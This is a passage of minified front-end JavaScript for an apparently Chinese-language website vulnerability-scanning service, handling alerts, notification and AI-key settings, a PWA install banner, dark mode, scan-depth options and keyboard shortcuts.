e=document.getElementById("nav-alert-badge");e&&(e.style.display="none");return}fetch("/api/alerts/unread-count",{headers:Qe()}).then(function(e){return e.json()}).then(function(e){let i=document.getElementById("nav-alert-badge");if(!i)return;let t=e.unread_count||0;t>0?(i.textContent=t>99?"99+":t,i.style.display="inline-block"):i.style.display="none"})}function Xa(){fetch("/api/me/notifications",{headers:Qe()}).then(function(e){return e.json()}).then(function(e){if(e.success){let i=document.getElementById("notify-email-input"),t=document.getElementById("notify-webhook-input"),s=document.getElementById("notify-threshold-select");i&&(i.value=e.email||""),t&&(t.value=e.webhook||""),s&&(s.value=e.threshold||"high")}})}function Va(){let e=document.getElementById("notify-email-input").value.trim(),i=document.getElementById("notify-webhook-input").value.trim(),t=document.getElementById("notify-threshold-select").value;fetch("/api/me/notifications",{method:"POST",headers:Object.assign({"Content-Type":"application/json"},Qe()),body:JSON.stringify({email:e,webhook:i,threshold:t})}).then(function(s){return s.json()}).then(function(s){s.success?ie("通知设置已保存","success"):ie(s.error||"保存失败","error")})}function Ga(){let e=document.getElementById("ai-config-apikey"),i=document.getElementById("ai-config-eye");!e||!i||(e.type==="password"?(e.type="text",i.textContent="隐藏"):(e.type="password",i.textContent="显示"))}function Kn(){let e=Jn(),i=document.getElementById("ai-config-apikey"),t=document.getElementById("ai-config-provider"),s=document.getElementById("ai-config-model"),r=document.getElementById("setting-useLLM");if(i&&(i.value=e.api_key||""),t&&(t.value=e.provider||"openai"),s&&(s.value=e.model||""),r){let o=e.use_llm!==!1;r.dataset.enabled=o?"true":"false",r.classList.toggle("on",o)}}let Ke=null;function Yn(){try{if(window.__TAURI__||window.__TAURI_INTERNALS__)return}catch{}if(window.matchMedia&&window.matchMedia("(display-mode: standalone)").matches||document.getElementById("pwa-install-banner"))return;let e=document.createElement("div");e.id="pwa-install-banner",e.style.cssText="position:fixed;left:16px;right:16px;bottom:16px;z-index:9998;background:#1e293b;color:#fff;border:1px solid rgba(115,201,144,0.35);border-radius:12px;padding:12px 14px;box-shadow:0 14px 32px rgba(0,0,0,0.28);display:flex;gap:12px;align-items:center;justify-content:space-between;flex-wrap:wrap",e.innerHTML='<div style="min-width:220px;flex:1"><div style="font-size:13px;font-weight:700;margin-bottom:2px">安装为桌面应用</div><div style="font-size:12px;color:#cbd5e1;line-height:1.5">把漏洞哨兵加入桌面或开始菜单，像 App 一样直接打开。</div></div><div style="display:flex;gap:8px;flex-wrap:wrap"><button id="pwa-install-btn" style="background:#73c990;color:#0f172a;border:none;padding:8px 14px;border-radius:8px;font-weight:700;cursor:pointer">立即安装</button><button id="pwa-install-close" style="background:transparent;color:#cbd5e1;border:1px solid rgba(203,213,225,0.28);padding:8px 14px;border-radius:8px;cursor:pointer">稍后</button></div>',document.body.appendChild(e);var i=document.getElementById("pwa-install-close"),t=document.getElementById("pwa-install-btn");i&&i.addEventListener("click",function(){e.remove();try{localStorage.setItem("vs_pwa_banner_hidden","true")}catch{}}),t&&t.addEventListener("click",async function(){Ke?(Ke.prompt(),await Ke.userChoice,Ke=null):ie("当前不支持浏览器安装提示。","info"),e.remove();try{localStorage.setItem("vs_pwa_banner_hidden","true")}catch{}})}window.addEventListener("beforeinstallprompt",function(e){e.preventDefault(),Ke=e;try{if(localStorage.getItem("vs_pwa_banner_hidden")==="true")return}catch{}Yn()});window.addEventListener("appinstalled",function(){Ke=null;const e=document.getElementById("pwa-install-banner");e&&e.remove()});Dn(function(){let e=_e("app");e&&Li&&(e.innerHTML=Li);try{oa()}catch(c){console.warn("initAuthCheckboxBinding error:",c)}try{Ke&&localStorage.getItem("vs_pwa_banner_hidden")!=="true"&&Yn()}catch{}pr().then(function(c){let p=c&&c.data||c||{};p.stripe_publishable_key&&(window.__STRIPE_PUBLISHABLE_KEY__=p.stripe_publishable_key),p.public_base_url&&(window.__PUBLIC_BASE_URL__=p.public_base_url)}).catch(function(){});let i=_e("skeleton-screen");i&&i.classList.add("hidden"),setTimeout(function(){i&&(i.style.display="none")},350);let t={quick:"约 1-2 秒 · 仅响应头",standard:"约 3-5 秒 · 推荐",deep:"约 10+ 秒 · 含攻击测试"};document.querySelectorAll(".scan-depth-opt").forEach(function(c){c.addEventListener("click",function(p){p.preventDefault();let h=this.getAttribute("data-value"),m=this.querySelector('input[type="radio"]');m&&(m.checked=!0,m.dispatchEvent(new Event("change",{bubbles:!0}))),document.querySelectorAll(".scan-depth-opt").forEach(function(y){y.classList.remove("active"),y.style.background="var(--bg)",y.style.color="var(--text)"}),this.classList.add("active"),this.style.background="var(--primary)",this.style.color="#fff";let g=document.getElementById("depth-hint");g&&(g.textContent=t[h]||"约 3-5 秒 · 推荐")})});try{updateProfileStats()}catch(c){console.warn("updateProfileStats error:",c)}try{ut()}catch(c){console.warn("updateAuthUI error:",c)}try{Kn()}catch(c){console.warn("renderAIConfig error:",c)}try{let c=document.getElementById("setting-notify");if(c){let p=localStorage.getItem("vs_notify")!=="0";c.dataset.enabled=p?"true":"false",c.classList.toggle("on",p)}}catch{}Le()&&typeof window.loadTrendChart=="function"&&window.loadTrendChart(30),Le()&&ke("/api/history?limit=1").then(function(c){c.status===401&&typeof ie=="function"&&ie("登录已过期，请重新登录")}).catch(function(){});try{if(localStorage.getItem("vs_dark")==="1"){document.documentElement.setAttribute("data-theme","dark");let c=_e("setting-darkMode");c&&(c.dataset.enabled="true",c.textContent="已开启",c.style.color="var(--success)"),r(!0)}}catch{}function s(){let c=document.documentElement.getAttribute("data-theme")==="dark";if(c){document.documentElement.removeAttribute("data-theme");try{localStorage.removeItem("vs_dark")}catch{}let p=_e("setting-darkMode");p&&(p.dataset.enabled="false",p.textContent="未开启",p.style.color="var(--text-lighter)"),ie("已切换至亮色模式")}else{document.documentElement.setAttribute("data-theme","dark");try{localStorage.setItem("vs_dark","1")}catch{}let p=_e("setting-darkMode");p&&(p.dataset.enabled="true",p.textContent="已开启",p.style.color="var(--success)"),ie("已切换至暗色模式")}r(!c)}window.toggleThemeQuick=s;function r(c){let p=_e("theme-icon");p&&(c?p.innerHTML='<path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/>':p.innerHTML='<circle cx="12" cy="12" r="5"/><path d="M12 1v2M12 21v2M4.22 4.22l1.42 1.42M18.36 18.36l1.42 1.42M1 12h2M21 12h2M4.22 19.78l1.42-1.42M18.36 5.64l1.42-1.42"/>')}window.updateThemeIcon=r;let o=_e("login-password");o&&o.addEventListener("keydown",function(c){c.key==="Enter"&&Wi()});let a=_e("reg-email"),n=_e("reg-password"),d=_e("reg-password2");a&&a.addEventListener("keydown",function(c){c.key==="Enter"&&Ot()}),n&&n.addEventListener("keydown",function(c){c.key==="Enter"&&Ot()}),d&&d.addEventListener("keydown",function(c){c.key==="Enter"&&Ot()});let f=_e("scan-url");f&&f.addEventListener("keydown",function(c){if(c.key!=="Enter")return;let p=document.getElementById("auth-check-step1");p&&p.checked&&Le()?typeof window.startScanDirect=="function"&&window.startScanDirect():typeof window.goVerifyStep2=="function"&&window.goVerifyStep2()}),document.addEventListener("keydown",function(c){if(c.key==="Escape"){let p=document.getElementById("ai-chat");if(p&&p.classList.contains("show")){p.classList.remove("show"),p.style.display="";return}document.querySelectorAll('.modal.show, [id$="-modal"][style*="display: block"]').forEach(function(m){m.style.display="none",m.classList.remove("show")})}if((c.ctrlKey||c.metaKey)&&c.key==="k"){c.preventDefault();let p=document.getElementById("scanUrl")||document.getElementById("scan-url");p&&(p.focus(),p.select())}if((c.ctrlKey||c.metaKey)&&c.key==="/"){c.preventDefault();let p=document.querySelector('[onclick*="aiChat" i], [onclick*="openAiAdvisor" i], [onclick*="showAiChat" i], #ai-advisor-btn, .ai-advisor-fab');p||(p=document.querySelector('button[aria-label*="安全顾问" i], button[aria-label*="AI" i]')),p?p.click():typeof toggleAiChat=="function"?toggleAiChat():typeof openAiAdvisor=="function"&&openAiAdvisor()}});function v(){document.querySelectorAll(".counter[data-count]").forEach(function(p){let h=parseInt(p.getAttribute("data-count"),10),m=p.getAttribute("data-suffix")||"",g=1200,y=0,b=null;function k(x){b||(b=x);let C=Math.min((x-b)/g,1),z=1-Math.pow(1-C,3),P=Math.floor(y+(h-y)*z);p.textContent=P+m,C<1&&requestAnimationFrame(k)}requestAnimationFrame(k)})}document.querySelector(".counter[data-count]")&&setTimeout(v,300),window.navigateTo=zt,window.toggleAIChat=Sa,window.sendAIMessage=Vn,window.askAIQuick=Ia,window.analyzeFixer=La,window.loadSampleConfig=Aa,window.clearFixer=Ba,window.doLogin=Wi,window.doRegister=Ot,window.doLogout=qn,window.refreshAuthChallenge=ca,window.copyApiToken=pa,window.doResetPassword=ua,window.toggleAuthForm=Un,window.showProfileTab=Da,window.markAllAlertsRead=Za,window.toggleSetting=Na,window.saveNotificationSettings=Va,window.toggleApiKeyVisibility=Ga,window.saveAIConfig=$a,window.clearAIConfig=Ua,window.loadCreditsUsage=mi,window.updateUserCredits=Fe,window.scanAsset=_a,window.extractError=rt,window.friendlyError=Gn,window.showToast=ie,window.isLoggedIn=Le,window.toggleAISetting=qa,window.editAsset=wa,window.deleteAsset=ka,window.createMonitor=ma,window.aiSend=Xn,window.aiAsk=Zn,window.createTeam=xa,window.markAlertRead=Wa,window.loadEvolution=Qt;try{na()}catch(c){console.warn("initBillingPage error:",c)}document.body.addEventListener("click",function(c){c.target.closest('[data-action="add-asset"]')&&(c.preventDefault(),Uo())})});typeof window<"u"&&(window.downloadNginxConf=Pa,window.downloadRepairReport=Fa);typeof window<"u"&&(window.copyText=ja,window.submitFindingFeedback=ha);
